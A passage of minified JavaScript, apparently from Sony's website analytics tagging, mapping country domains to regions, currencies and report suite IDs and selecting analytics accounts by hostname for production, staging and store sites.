"presscentre.sony.ru,presscentre.sony.eu,instagram.com"},SE:{region:"EU",domainRegex:".*.?sony.se$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"SEK",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},SI:{region:"EU",domainRegex:".*.?sony.si$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},SK:{region:"EU",domainRegex:".*.?sony.sk$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},TR:{region:"EU",domainRegex:".*.?sony.com.tr$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"TRY",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},UA:{region:"EU",domainRegex:".*.?sony.ua$",local_rsid:"",region_rsid:"sonygwt-gwn-cis-prod",local_currency:"UAH",sit_rsid:"sonygwt-gwn-cis-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},YU:{region:"EU",domainRegex:".*.?sony.rs$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"RSD",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},RS:{region:"EU",domainRegex:".*.?sony.rs$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"RSD",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},IL:{region:"EU",domainRegex:".*.?sony.co.il$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"ILS",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},AR:{region:"CSA",domainRegex:".*.?sony.com.ar$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"ARS",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},MX:{region:"MEX",domainRegex:".*.?sony.com.mx$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"MXN",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},CL:{region:"CSA",domainRegex:".*.?sony.cl$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"CLP",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},CO:{region:"CSA",domainRegex:".*.?sony.com.co$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"COP",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},PA:{region:"CSA",domainRegex:".*.?sony.com.pa$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"PAB",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},BR:{region:"BR",domainRegex:".*.?(sony|batendoosso).com.br$",local_rsid:"",region_rsid:"sonygwt-gwn-br-prod",local_currency:"BRL",sit_rsid:"sonygwt-gwn-br-sit",SITTrafficForProd:!1,externalLinks:"esupport.sony.com/BR,www.sony.com.br/regional"},CR:{region:"CSA",domainRegex:".*.?sony.co.cr$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"CRC",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},BO:{region:"CSA",domainRegex:".*.?sony.com.bo$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"BOB",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},DO:{region:"CSA",domainRegex:".*.?sony.com.do$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"DOP",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},EC:{region:"CSA",domainRegex:".*.?sony.com.ec$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},SV:{region:"CSA",domainRegex:".*.?sony.com.sv$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},GT:{region:"CSA",domainRegex:".*.?sony.com.gt$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"GTQ",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},HN:{region:"CSA",domainRegex:".*.?sony.com.hn$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"HNL",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},PY:{region:"CSA",domainRegex:".*.?sony.com.py$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"PYG",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},PE:{region:"CSA",domainRegex:".*.?sony.com.pe$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"PEN",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},PR:{region:"CSA",domainRegex:".*.?sony.com.pr$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},VE:{region:"CSA",domainRegex:".*.?sony.com?.ve$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"VEF",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},NI:{region:"CSA",domainRegex:".*.?sony.com.ni$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"NIO",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},SOLA:{region:"CSA",domainRegex:".*.?sony-latin.com$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"ARS",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},LM:{region:"CSA",domainRegex:".*.?sony-latin.com$",local_rsid:"",region_rsid:"sonygwt-gwn-csa-prod",local_currency:"ARS",sit_rsid:"sonygwt-gwn-csa-sit",SITTrafficForProd:!1,externalLinks:""},US:{region:"USA",domainRegex:".*.?(sony|us.aibo|sonypremiumhome).com$",local_rsid:"",region_rsid:"sonygwt-gwn-na-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-na-sit",SITTrafficForProd:!1,externalLinks:"pages.email.sel.sony.com/optin,us.community.sony.com/s/,us.esupport.sony.com,rewards.sony.com"},CA:{region:"CAN",domainRegex:".*.?(shopgentec|sony).ca$",local_rsid:"",region_rsid:"sonygwt-gwn-na-prod",local_currency:"CAD",sit_rsid:"sonygwt-gwn-na-sit",SITTrafficForProd:!1,externalLinks:"ca.community.sony.com/s/,ca.esupport.sony.com"},AE:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"AED",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ae"},AO:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"AOA",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ao"},AU:{region:"AMEA",domainRegex:".*.?sony.com.au$",local_rsid:"",region_rsid:"sonygwt-gwn-anz-prod",local_currency:"AUD",sit_rsid:"sonygwt-gwn-anz-sit",SITTrafficForProd:!1,externalLinks:"sony.com.au/login,sony.com.au/microsite,sony.com.au/registerproduct,sony.com.au/section,sites.sony.com.au,sony.com.au/extrabass,ap.community.sony.com"},BF:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XOF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-bf"},BH:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"BHD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-bh"},BJ:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XOF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-bj"},CG:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XAF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-cd"},CI:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XOF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ci"},CM:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XAF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-cm"},DZ:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"DZD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-dz"},GA:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XAF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ga"},GH:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"GHS",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/gh"},ID:{region:"AMEA",domainRegex:".*.?sony.co.id$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"IDR",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony.co.id/section,ap.community.sony.com"},IQ:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"IQD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-iq"},JO:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"JOD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-jo"},KE:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"KES",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/ke"},KR:{region:"AMEA",domainRegex:".*.?sony.co.kr$",local_rsid:"",region_rsid:"sonygwt-gwn-kr-prod",local_currency:"KRW",sit_rsid:"sonygwt-gwn-kr-sit",SITTrafficForProd:!1,externalLinks:"bpeng.sony.co.kr,store.sony.co.kr/handler,sony.co.kr/handler,scs.sony.co.kr/scs/handler,sony.co.kr/scs"},KW:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"KWD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-kw"},LB:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"LBP",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-lb"},LR:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"LRD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/lr"},LY:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"LYD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ly"},MA:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"MAD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ma"},MU:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"MUR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-mu"},MY:{region:"AMEA",domainRegex:".*.?sony.com.my$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"MYR",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"corp.sony.com.my,sony.com.my/microsite,sony.com.my/section,mysony.sony.com.my,store.sony.com.my,ap.community.sony.com"},NG:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"NGN",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/ng"},NZ:{region:"AMEA",domainRegex:".*.?sony.co.nz$",local_rsid:"",region_rsid:"sonygwt-gwn-anz-prod",local_currency:"NZD",sit_rsid:"sonygwt-gwn-anz-sit",SITTrafficForProd:!1,externalLinks:"sony.co.nz/login,sony.co.nz/microsite,sony.co.nz/registerproduct,sony.co.nz/section,sony.co.nz/summerwithsony,sites.sonyanz.com,store.sony.co.nz,ap.community.sony.com"},OM:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"OMR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-om"},PH:{region:"AMEA",domainRegex:".*.?sony.com.ph$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"PHP",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony.com.ph/section,sony.com.ph/microsite,sdw.sony.com.ph/User,ap.community.sony.com"},PK:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"PKR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/pk"},QA:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"QAR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-qa"},SA:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"SAR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-sa"},SG:{region:"AMEA",domainRegex:".*.?sony.com.sg$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"SGD",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony.com.sg/section,sony.com.sg/microsite,sdw.sony.com.sg/SDWUser,sony.com.sg/registerproduct,sony.com.sg/login,ap.community.sony.com"},SN:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"XOF",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-sn"},SY:{region:"AMEA",domainRegex:"",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"SYP",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:""},TH:{region:"AMEA",domainRegex:".*.?sony.co.th$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"THB",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony.co.th/microsite,sony.co.th/section,my.sony.co.th,sony-asia.com/a7sm2seewhatwecantsee,sony-asia.com/microsite,ap.community.sony.com"},TN:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"TND",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-tn"},TW:{region:"AMEA",domainRegex:".*.?sony.com.tw$",local_rsid:"",region_rsid:"sonygwt-gwn-tw-prod",local_currency:"TWD",sit_rsid:"sonygwt-gwn-tw-sit",SITTrafficForProd:!1,externalLinks:"csr.sony.com.tw,service.sony.com.tw,store.sony.com.tw,tw.sony-asia.com,sony.com.tw/corporate,www.sony.com.tw/microsite/support/survey.html"},TZ:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"TZS",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/tz"},UG:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"UGX",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/ug"},VN:{region:"AMEA",domainRegex:".*.?sony.com.vn$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"VND",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony.com.vn/section,sony.com.vn/support,store.sony.com.vn,sony.com.vn/microsite,mysony.sony.com.vn,sonycenter.sony.com.vn,sony.com.vn/article,baohanhdientu.sony.com.vn/tracuu"},YE:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"YER",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-ye"},ZA:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"ZAR",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"sony-asia.com/microsite,sony-africa.com/microsite,sony-mea.com/section,sony-mea.com/microsite",domainLocaleRegex:"^/za"},EG:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"EGP",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/..-eg"},ET:{region:"AMEA",domainRegex:".*.?sony.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"ETB",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"",domainLocaleRegex:"^/et"},AP:{region:"AMEA",domainRegex:".*.?sony-asia.com$",local_rsid:"",region_rsid:"sonygwt-gwn-sea-prod",local_currency:"CNY",sit_rsid:"sonygwt-gwn-sea-sit",SITTrafficForProd:!1,externalLinks:"sony-asia.com/microsite(?!/support/interactive),sony-asia.com/section,ap.community.sony.com"},XM:{region:"AMEA",domainRegex:".*.?sony-mea.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"sony-mea.com/microsite,sony-mea.com/section,sony-africa.com/promotions,sony-asia.com/microsite/aboutsony,ap.community.sony.com"},XA:{region:"AMEA",domainRegex:".*.?sony-africa.com$",local_rsid:"",region_rsid:"sonygwt-gwn-ga-prod",local_currency:"USD",sit_rsid:"sonygwt-gwn-ga-sit",SITTrafficForProd:!1,externalLinks:"sony-africa.com/microsite,sony-africa.com/section,sony-asia.com/microsite"},XX:{region:"AMEA",domainRegex:"",local_rsid:"",region_rsid:"sonygwt-gwn-err-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-err-sit",SITTrafficForProd:!1,externalLinks:""},IN:{region:"AMEA",domainRegex:".*.?sony.co.in$",local_rsid:"",region_rsid:"sonygwt-gwn-in-prod",local_currency:"INR",sit_rsid:"sonygwt-gwn-in-sit",SITTrafficForProd:!1,externalLinks:"sony.co.in/section,sony.co.in/microsite,sony.co.in/webchatform,sony.co.in/support,alphacommunity.sony.co.in,ap.community.sony.com"},HK:{region:"AMEA",domainRegex:".*.?sony.com.hk$",local_rsid:"",region_rsid:"sonygwt-gwn-hk-prod",local_currency:"HKD",sit_rsid:"sonygwt-gwn-hk-sit",SITTrafficForProd:!1,externalLinks:"www.sony.com.hk/service/contactus/en/index.do,www.sony.com.hk/service/contactus/zh/index.do"},CN:{region:"AMEA",domainRegex:"",local_rsid:"",region_rsid:"sonygwt-gwn-cn-prod",local_currency:"CNY",sit_rsid:"sonygwt-gwn-cn-sit",SITTrafficForProd:!1,externalLinks:""},JP:{region:"AMEA",domainRegex:".*.?sony.jp$",local_rsid:"",region_rsid:"sonygwt-gwn-jp-prod",local_currency:"JPY",sit_rsid:"sonygwt-gwn-jp-sit",SITTrafficForProd:!1,externalLinks:""}};try{if("GL"===e)for(var o in a)a.hasOwnProperty(o)&&void 0!==a[o].domainRegex&&""!==a[o].domainRegex&&null!==window.location.host.match(a[o].domainRegex)&&void 0===a[o].domainLocaleRegex&&(e=o),a.hasOwnProperty(o)&&void 0!==a[o].domainRegex&&""!==a[o].domainRegex&&null!==window.location.host.match(a[o].domainRegex)&&void 0!==a[o].domainLocaleRegex&&null!==window.location.pathname.match(a[o].domainLocaleRegex)&&(e=o)}catch(e){}if(void 0!==t&&void 0!==a.GL[t])return void 0===a[e]?a.GL[t]:a[e][t];var i="sonygwt-gwn-err-prod";if(null===window.location.host.match(/(module-library-pdp\.sony\.co\.uk|gccs-pdp\.sony\.|pdp\.ci\.|sit1a-pdp\.|sit1b-pdp\.|pet-pdp\.|qa-pdp\.|uat-pdp\.|uat-site\.|preview\-production\-pdp\.|production\-pdp\.|test\.|stg3\.|stg\.|test\-shop|qa\-shop|esp\.stg\.campaign\.odw\.sony\-europe|195\.128\.120\.67|sony.registriastaging.com|sony\-(uat|pdp|staging)\.metaltoad\-sites\.com|.*\-\-tst\.custhelp\.com|uat\.locator\.sony|carluccidesign\.com|test\.sony|srtestdev\.sony\.jp|stgservices\.sony|website-us-qas\.grif\.cloud|localhost:\d|ci-pdp\.sony|\.force\.com|stg4?-store\.sony\.ru|wwwd\.sony\.com\.hk|(b2cqa|sonybr)\.myvtex\.com|\.(preview|webengine)\.zesty\.io|27\.54\.47\.101)|((stage|dev)\.electronics\.sony\.com)|(development|staging)-web-sony\.demandware\.net|.*\.adobecqms\.net|qa\.alphauniverse-latin\.com|^(dev|stg)\.alphauniverse\.|^beta\.sony\./gi)){i="sonygwt-gwn-err-prod";try{void 0!==a[e]&&(i=a[e].region_rsid,a[e].SITTrafficForProd&&void 0!==a[e]&&""!==a[e].sit_rsid&&(i+=","+a[e].sit_rsid))}catch(e){}}else{i="sonygwt-gwn-err-prod";try{void 0!==a[e]&&(i=a[e].sit_rsid)}catch(e){}}if("www.sony.co.uk"===document.location.host&&/\/locale-selector\/?$/gi.test(document.location.pathname)&&""===(r=""!==document.referrer?document.referrer:"")&&(document.URL.indexOf("redirect=vaioportal")>-1||document.URL.indexOf("redirect%3Dvaioportal")>-1)&&""===r&&(i="sonygwt-gwn-err-prod"),document.URL.indexOf("community-stage.sony")>-1)i="sonygwt-gwn-eu-sit";else if(document.URL.indexOf("community.sony")>-1||document.URL.indexOf("campaign.odw.sony-europe.com/community")>-1){var r=""!==document.referrer?document.referrer:"";(document.URL.indexOf("redirect=vaioportal")>-1||document.URL.indexOf("redirect%3Dvaioportal")>-1)&&""===r&&(i="sonygwt-gwn-err-prod"),document.location.pathname.indexOf("/t5/custom/page/page-id/CountrySelector")>-1&&""===r&&(i="sonygwt-gwn-err-prod")}else if("www.sony.eu"===document.location.host&&/\/support\/?$/gi.test(document.location.pathname)){""===(r=""!==document.referrer?document.referrer:"")&&(i="sonygwt-gwn-err-prod")}else document.URL.indexOf("campaign.odw.sony-europe.com/support/index.html")>-1&&""===document.referrer&&(i="sonygwt-gwn-err-prod");return document.URL.indexOf("outlet.sony.de/shop/Kameras-mit-eingebautem-Objektiv/Die-RX-Serie")>-1&&(i="sonygwt-gl-errors"),i},_bsq.aa.identifyStore=function(){var e=[],t="";return/^stg4?-store\.sony\.ru$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-cis-sit"),t="rustore"):/^store\.sony\.ru$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-cis-prod"),t="rustore"):/wwwd\.sony\.com\.hk$/gi.test(window.location.hostname)&&/\/webapp\/cart\//gi.test(window.location.pathname)?(e.push("sonygwt-gwn-hk-sit"),t="hkstore"):/www\.sony\.com\.hk$/gi.test(window.location.hostname)&&/\/webapp\/cart\//gi.test(window.location.pathname)?(e.push("sonygwt-gwn-hk-prod"),t="hkstore"):/^stg\.store\.sony\.(com\.(sg|my|vn)|co\.th)$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-sea-sit"),t="seastore"):/^store\.sony\.(com\.(sg|my|vn)|co\.th)$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-sea-prod"),t="seastore"):/sony-development\.myshopify\.com$/i.test(window.location.hostname)?(e.push("sonygwt-gwn-na-sit"),t="castore"):/\.thesonyshop.ca$/i.test(window.location.hostname)?(e.push("sonygwt-gwn-na-prod"),t="castore"):(/vtexcommercestable/gi.test(location.hostname)||/sonyb2c\.myvtex\.com/gi.test(location.hostname)||/(pa|ar|mx|pe|ec|cl|co)sonyb2cqa\.myvtex\.com/gi.test(location.hostname))&&!/(sonyteleventas|sonyempleados)/gi.test(location.hostname)?(e.push("sonygwt-gwn-csa-sit"),t="csastore"):/(store|corporativostore|empleadostore)\.sony\.(com\.(ar|co|mx|pe|ec|pa)|cl)$/gi.test(window.location.hostname)||/sonyteleventas\.myvtex\.com$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-csa-prod"),t="csastore"):/(development|staging)-web-sony\.demandware\.net$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-anz-sit"),t="anzstore"):/store\.sony\.(com\.au|co\.nz)$/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-anz-prod"),t="anzstore"):/model-t\.cc\.commerce\.ondemand\.com|stage\.electronics\.sony\.com/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-na-sit"),t="usstore"):/^electronics\.sony\.com/gi.test(window.location.hostname)?(e.push("sonygwt-gwn-na-prod"),t="usstore"):/^regional:ecommerce$/gi.test(utag_data.website_platform)&&/(preview-uat-pdp\.sony\.(co\.uk|de))$/gi.test(window.location.hostname)&&/^\/store/gi.test(window.location.pathname)?(e.push("sonygwt-gwn-eu-sit"),t="eustore"):/^regional:ecommerce$/gi.test(utag_data.website_platform)&&/(www\.sony\.(co\.uk|de))$/gi.test(window.location.hostname)&&/^\/store/gi.test(window.location.pathname)&&(e.push("sonygwt-gwn-eu-prod"),t="eustore"),{store:t,rsid:e.join(",")}},_bsq.aa.initDil=function(){},r&&(window.optimizely=window.optimizely||[],window.optimizely.push("activateSiteCatalyst")),_bsq.aa.sendUnloadMetrics=function(e){if(/(gallery|subgallery|product accessories)/gi.test(utag_data.aaPageTemplate)&&"undefined"!=typeof GALLERYFILTER){_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,""),_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,"");var t=GALLERYFILTER.filtersObj.map((function(e){if("tv-home-cinema"===utag_data.aaProductCategory1){var t={"gal-filter-resolution-television":"resolution-tv","gal-filter-screensize-android-tvs-television":"androidtvsscrnsze","gal-filter-type-television":"type-tv"};for(var a in e.key=e.key.replace(/-en_gl.*/gi,""),t)e.key=e.key.replace(a,t[a])}return e.key+"="+e.val})).join(";"),a=_bsq.utils.getQueryParameter(document.URL,"sort");_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,t),_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,a)}},_bsq.aa.all_countModules=function(){for(var e=[],t=[],a="",o=0;o<u.page.modules.length;o++)""!==(a=u.page.modules[o].masterName||"")&&"navigation"!==u.page.modules[o].lv1&&t.push(a),""!==a&&e.push(a);return e.length+"|"+t.length},_bsq.aa.all_unsupportedBrowser=function(){var 